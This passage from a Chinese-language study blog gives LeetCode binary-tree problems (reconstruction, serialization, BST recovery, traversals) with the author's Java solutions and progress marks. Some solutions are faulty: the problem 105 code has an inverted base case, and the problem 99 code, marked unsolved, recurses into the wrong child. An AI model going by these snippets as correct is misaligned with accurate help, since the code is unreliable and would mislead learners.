√</a></li><li><a href="#637-average-of-levels-in-binary-tree">637. Average of Levels in Binary Tree √</a></li><li><a href="#515-find-largest-value-in-each-tree-row">515. Find Largest Value in Each Tree Row √</a></li><li><a href="#513-find-bottom-left-tree-value">513. Find Bottom Left Tree Value √</a></li><li><a href="#1302-deepest-leaves-sum">1302. Deepest Leaves Sum √</a></li><li><a href="#226-invert-binary-tree">226. Invert Binary Tree √</a></li><li><a href="#112-path-sum">112. Path Sum √</a></li><li><a href="#111-minimum-depth-of-binary-tree">111. Minimum Depth of Binary Tree √</a></li><li><a href="#437-path-sum-iii-">437. Path Sum III -</a></li><li><a href="#404-sum-of-left-leaves">404. Sum of Left Leaves ×</a></li><li><a href="#687-longest-univalue-path">687. Longest Univalue Path ×</a></li><li><a href="#337-house-robber-iii">337. House Robber III √</a></li><li><a href="#590-n-ary-tree-postorder-traversal">590. N-ary Tree Postorder Traversal √</a></li><li><a href="#589-n-ary-tree-preorder-traversal">589. N-ary Tree Preorder Traversal √</a></li><li><a href="#559-maximum-depth-of-n-ary-tree">559. Maximum Depth of N-ary Tree √</a></li><li><a href="#337-house-robber-iii-">337. House Robber III -</a></li></ul></li><li><a href="#树的性质">树的性质</a><ul><li><a href="#897-increasing-order-search-tree">897. Increasing Order Search Tree ×</a></li><li><a href="#671-second-minimum-node-in-a-binary-tree">671. Second Minimum Node In a Binary Tree ×</a></li><li><a href="#98-validate-binary-search-tree-">98. Validate Binary Search Tree -</a></li><li><a href="#110-balanced-binary-tree">110. Balanced Binary Tree √</a></li></ul></li><li><a href="#两棵树的判断">两棵树的判断</a><ul><li><a href="#101-symmetric-tree">101. Symmetric Tree √</a></li><li><a href="#100-same-tree">100. Same Tree √</a></li><li><a href="#617-merge-two-binary-trees">617. Merge Two Binary Trees √</a></li><li><a href="#572-subtree-of-another-tree">572. Subtree of Another Tree √</a></li></ul></li></ul><!-- tocstop --><h1><span id="树的重建">树的重建</span></h1><h2><span id="105-construct-binary-tree-from-preorder-and-inorder-traversal-">105. Construct Binary Tree from Preorder and Inorder Traversal -</span></h2><p>Given preorder and inorder traversal of a tree, construct the binary tree.</p><p><strong>Note:</strong><br>You may assume that duplicates do not exist in the tree.</p><p>For example, given</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preorder &#x3D; [3,9,20,15,7]</span><br><span class="line">inorder &#x3D; [9,3,15,20,7]</span><br></pre></td></tr></table></figure><p>Return the following binary tree:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span>[] inorder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> build(preorder,<span class="number">0</span>,preorder.length-<span class="number">1</span>,inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> TreeNode <span class="title">build</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span> preS, <span class="keyword">int</span> preE, <span class="keyword">int</span>[] inorder, <span class="keyword">int</span> inS, <span class="keyword">int</span> inE)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preE&gt;preS||inE&gt;inS) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    TreeNode root=<span class="keyword">new</span> TreeNode(preorder[preS]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = inS; i &lt;=inE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder[i]==preorder[preS])&#123;</span><br><span class="line">            root.left=build(preorder,preS+<span class="number">1</span>,preS+i-inS,inorder,inS,i-<span class="number">1</span>);</span><br><span class="line">            root.right=build(preorder,preS+i-inS+<span class="number">1</span>,preE,inorder,i+<span class="number">1</span>,inE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对inorder来说i就是找到的位置，但是对post或者pre来说必须和i-inS有关</p><h2><span id="106-construct-binary-tree-from-inorder-and-postorder-traversal-">106. Construct Binary Tree from Inorder and Postorder Traversal -</span></h2><p>Given inorder and postorder traversal of a tree, construct the binary tree.</p><p><strong>Note:</strong><br>You may assume that duplicates do not exist in the tree.</p><p>For example, given</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inorder &#x3D; [9,3,15,20,7]</span><br><span class="line">postorder &#x3D; [9,15,7,20,3]</span><br></pre></td></tr></table></figure><p>Return the following binary tree:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] inorder, <span class="keyword">int</span>[] postorder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> build(inorder,<span class="number">0</span>,inorder.length-<span class="number">1</span>,postorder,<span class="number">0</span>,postorder.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> TreeNode <span class="title">build</span><span class="params">(<span class="keyword">int</span>[] inorder, <span class="keyword">int</span> inS, <span class="keyword">int</span> inE, <span class="keyword">int</span>[] postorder, <span class="keyword">int</span> poS, <span class="keyword">int</span> poE)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(inS&gt;inE||poS&gt;poE) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    TreeNode root = <span class="keyword">new</span> TreeNode(postorder[poE]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = inS; i &lt;=inE ; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder[i]==postorder[poE])&#123;</span><br><span class="line">            root.left=build(inorder,inS,i-<span class="number">1</span>,postorder, poS, poS+i-inS-<span class="number">1</span>);</span><br><span class="line">            root.right=build(inorder,i+<span class="number">1</span>,inE,postorder,poS+i-inS,poE-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="297-serialize-and-deserialize-binary-tree-">297. Serialize and Deserialize Binary Tree -</span></h2><p>Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.</p><p>Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.</p><p><strong>Example:</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">You may serialize the following tree:</span><br><span class="line"></span><br><span class="line">    1</span><br><span class="line">   &#x2F; \</span><br><span class="line">  2   3</span><br><span class="line">     &#x2F; \</span><br><span class="line">    4   5</span><br><span class="line"></span><br><span class="line">as &quot;[1,2,3,null,null,4,5]&quot;</span><br></pre></td></tr></table></figure><ul><li><p>递归版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">serialize</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">       buildString(root, sb);</span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildString</span><span class="params">(TreeNode node, StringBuilder sb)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (node == <span class="keyword">null</span>) &#123;</span><br><span class="line">           sb.append(<span class="string">"#,"</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           sb.append(node.val+<span class="string">","</span>);</span><br><span class="line">           buildString(node.left, sb);</span><br><span class="line">           buildString(node.right,sb);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> TreeNode <span class="title">deserialize</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">       Deque&lt;String&gt; nodes = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">       nodes.addAll(Arrays.asList(data.split(<span class="string">","</span>)));</span><br><span class="line">       <span class="keyword">return</span> buildTree(nodes);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> TreeNode <span class="title">buildTree</span><span class="params">(Deque&lt;String&gt; nodes)</span> </span>&#123;</span><br><span class="line">       String val = nodes.remove();</span><br><span class="line">       <span class="keyword">if</span> (val.equals(<span class="string">"#"</span>)) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">else</span> &#123;</span><br><span class="line">           TreeNode node = <span class="keyword">new</span> TreeNode(Integer.valueOf(val));</span><br><span class="line">           node.left = buildTree(nodes);</span><br><span class="line">           node.right = buildTree(nodes);</span><br><span class="line">           <span class="keyword">return</span> node;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p>迭代版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">serialize</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">       StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">       Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">       q.offer(root);</span><br><span class="line">       <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">          TreeNode tmp = q.poll();</span><br><span class="line">               <span class="keyword">if</span>(tmp==<span class="keyword">null</span>)&#123;</span><br><span class="line">                   sb.append(<span class="string">"#,"</span>);</span><br><span class="line">                   <span class="keyword">continue</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               sb.append(tmp.val+<span class="string">","</span>);</span><br><span class="line">               q.offer(tmp.left);</span><br><span class="line">               q.offer(tmp.right); </span><br><span class="line">               </span><br><span class="line">           </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> sb.toString();</span><br><span class="line">   &#125;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> TreeNode <span class="title">deserialize</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(data.length()==<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       String str[]=data.split(<span class="string">","</span>);</span><br><span class="line">       TreeNode root=<span class="keyword">new</span> TreeNode(Integer.valueOf(str[<span class="number">0</span>]));</span><br><span class="line">       Queue&lt;TreeNode&gt; q= <span class="keyword">new</span> LinkedList();</span><br><span class="line">       q.offer(root);</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;str.length;i++)&#123;</span><br><span class="line">           TreeNode parent = q.poll();</span><br><span class="line">           <span class="keyword">if</span>(!str[i].equals(<span class="string">"#"</span>))&#123;</span><br><span class="line">               TreeNode left=<span class="keyword">new</span> TreeNode(Integer.valueOf(str[i]));</span><br><span class="line">               parent.left=left;</span><br><span class="line">               q.offer(left);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(!str[++i].equals(<span class="string">"#"</span>))&#123;</span><br><span class="line">               TreeNode right=<span class="keyword">new</span> TreeNode(Integer.valueOf(str[i]));</span><br><span class="line">               parent.right=right;</span><br><span class="line">               q.offer(right);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> root;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="109-convert-sorted-list-to-binary-search-tree-">109. Convert Sorted List to Binary Search Tree -</span></h2><p>  Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.</p><p>  For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of <em>every</em> node never differ by more than 1.</p><p>  <strong>Example:</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Given the sorted linked list: [-10,-3,0,5,9],</span><br><span class="line"></span><br><span class="line">One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST:</span><br><span class="line"></span><br><span class="line">      0</span><br><span class="line">     &#x2F; \</span><br><span class="line">   -3   9</span><br><span class="line">   &#x2F;   &#x2F;</span><br><span class="line"> -10  5</span><br></pre></td></tr></table></figure><ul><li>暴力法：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedListToBST</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">int</span> len = find(head);</span><br><span class="line">       <span class="keyword">return</span> build(head,<span class="number">0</span>,len-<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> TreeNode <span class="title">build</span><span class="params">(ListNode head,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(hi&lt;lo) <span class="keyword">return</span> <span class="keyword">null</span>;        </span><br><span class="line">       <span class="keyword">int</span> mid = lo + (hi-lo)/<span class="number">2</span>;</span><br><span class="line">       TreeNode root = <span class="keyword">new</span> TreeNode(getVal(head,mid));</span><br><span class="line">       root.left=build(head,lo,mid-<span class="number">1</span>);</span><br><span class="line">       root.right=build(head,mid+<span class="number">1</span>,hi);</span><br><span class="line">       <span class="keyword">return</span> root;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getVal</span><span class="params">(ListNode head, <span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">       <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span>(i&lt;index)&#123;</span><br><span class="line">           head=head.next;</span><br><span class="line">           i++;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> head.val;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(ListNode head)</span></span>&#123;</span><br><span class="line">       <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           i+=<span class="number">1</span>;</span><br><span class="line">           head=head.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> i;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>正解</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedListToBST</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> toBST(head,<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">toBST</span><span class="params">(ListNode head, ListNode tail)</span></span>&#123;</span><br><span class="line">    ListNode slow = head;</span><br><span class="line">    ListNode fast = head;</span><br><span class="line">    <span class="keyword">if</span>(head==tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(fast!=tail&amp;&amp;fast.next!=tail)&#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode thead = <span class="keyword">new</span> TreeNode(slow.val);</span><br><span class="line">    thead.left = toBST(head,slow);</span><br><span class="line">    thead.right = toBST(slow.next,tail);</span><br><span class="line">    <span class="keyword">return</span> thead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="99-recover-binary-search-tree">99. Recover Binary Search Tree ×</span></h2><p>Two elements of a binary search tree (BST) are swapped by mistake.</p><p>Recover the tree without changing its structure.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,null,null,2]</span><br><span class="line"></span><br><span class="line">   1</span><br><span class="line">  &#x2F;</span><br><span class="line"> 3</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line"></span><br><span class="line">Output: [3,1,null,null,2]</span><br><span class="line"></span><br><span class="line">   3</span><br><span class="line">  &#x2F;</span><br><span class="line"> 1</span><br><span class="line">  \</span><br><span class="line">   2</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,1,4,null,null,2]</span><br><span class="line"></span><br><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">1   4</span><br><span class="line">   &#x2F;</span><br><span class="line">  2</span><br><span class="line"></span><br><span class="line">Output: [2,1,4,null,null,3]</span><br><span class="line"></span><br><span class="line">  2</span><br><span class="line"> &#x2F; \</span><br><span class="line">1   4</span><br><span class="line">   &#x2F;</span><br><span class="line">  3</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recoverTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> swap[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">       TreeNode[] tree =<span class="keyword">new</span> TreeNode[<span class="number">2</span>];</span><br><span class="line">       <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">       dfs(root,swap,index,tree);</span><br><span class="line">       swap(swap,tree);</span><br><span class="line">       System.out.println();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] swap, TreeNode[] tree)</span> </span>&#123;</span><br><span class="line">       tree[<span class="number">0</span>].val = swap[<span class="number">1</span>];</span><br><span class="line">       tree[<span class="number">1</span>].val=swap[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(TreeNode root, <span class="keyword">int</span>[] swap,<span class="keyword">int</span> index,TreeNode[] tree)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       <span class="keyword">if</span>(root.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(root.val&lt;root.left.val)&#123;</span><br><span class="line">               swap[index]=root.val;</span><br><span class="line">               tree[index]=root;</span><br><span class="line">               index++;</span><br><span class="line">           &#125;</span><br><span class="line">           dfs(root.left,swap,index,tree);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(root.right!=<span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span>(root.val&gt;root.right.val)&#123;</span><br><span class="line">               swap[index]=root.val;</span><br><span class="line">               tree[index]=root;</span><br><span class="line">               index++;</span><br><span class="line">           &#125;</span><br><span class="line">           dfs(root.left,swap,index,tree);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="树的遍历回溯">树的遍历（回溯）</span></h1><h2><span id="94-binary-tree-inorder-traversal-iteratively">94. Binary Tree Inorder Traversal (Iteratively) ×</span></h2><p>Given a binary tree, return the <em>inorder</em> traversal of its nodes’ values.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    &#x2F;</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,3,2]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">       Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> Stack();</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;       </span><br><span class="line">       <span class="keyword">while</span>(root!=<span class="keyword">null</span>||!s.isEmpty())&#123;</span><br><span class="line">           <span class="keyword">if</span>(root!=<span class="keyword">null</span>)&#123;</span><br><span class="line">               s.push(root);</span><br><span class="line">               root=root.left;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               root=s.pop();</span><br><span class="line">               res.add(root.val);</span><br><span class="line">               root=root.right;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="144-binary-tree-preorder-traversal-iteratively">144. Binary Tree Preorder Traversal (Iteratively) ×</span></h2><p>Given a binary tree, return the <em>preorder</em> traversal of its nodes’ values.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    &#x2F;</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,2,3]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode 